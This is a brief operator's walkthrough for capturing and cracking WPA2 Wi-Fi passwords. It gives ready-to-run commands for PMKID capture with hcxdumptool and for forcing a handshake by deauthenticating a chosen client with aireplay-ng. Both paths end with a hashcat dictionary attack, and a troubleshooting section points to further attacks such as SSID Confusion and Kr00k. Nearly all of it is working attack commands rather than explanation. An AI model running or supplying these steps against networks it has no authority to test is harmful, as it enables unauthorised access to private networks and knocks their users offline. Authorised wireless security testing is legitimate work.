# WPA2 — capture and crack walkthrough

Two workhorse paths. Try PMKID first (no client interaction). If the AP
suppresses PMKID, fall back to 4-way capture with targeted deauth.

## Path A — PMKID (Steube 2018)

```
# on the Pineapple, over SSH
hcxdumptool -i wlan1 -o /tmp/pmkid.pcapng --enable_status=1 \
            --filterlist_ap=/root/target.bssidlist --filtermode=2

# stop after PMKID landed
Ctrl-C

# convert to hashcat 22000
hcxpcapngtool -o /tmp/hs.22000 /tmp/pmkid.pcapng

# crack (on the laptop, GPU-bound)
hashcat -m 22000 /tmp/hs.22000 rockyou.txt --status -w 4
```

## Path B — 4-way handshake + targeted deauth

```
# monitor mode
airmon-ng start wlan1

# capture in the background
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/wpa2 wlan1mon &

# knock a specific client so it reassociates
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan1mon

# convert
hcxpcapngtool -o /tmp/hs.22000 /tmp/wpa2-01.cap

# crack
hashcat -m 22000 /tmp/hs.22000 rockyou.txt
```

## Failure modes

- **No M2 landed.** aireplay reason-7 fired but the client is PMF-capable
  on a PMF-required AP. Try SSID Confusion, Kr00k trigger, or wait for
  natural reassoc.
- **hashcat says 'no hashes loaded'.** hcxpcapngtool didn't find a
  complete pair. `hcxpcapngtool --info` on the pcap shows what it saw.
- **Handshake landed but crack takes forever.** PSK is not in
  `rockyou.txt`. Move to `cracking-tradecraft` (masks, rules, SSID-derived
  wordlists).

## Cite

- Steube 2018 — PMKID attack.
- aircrack-ng documentation, WPA/WPA2 tutorial.
- hcxtools GitHub — hcxdumptool / hcxpcapngtool README.
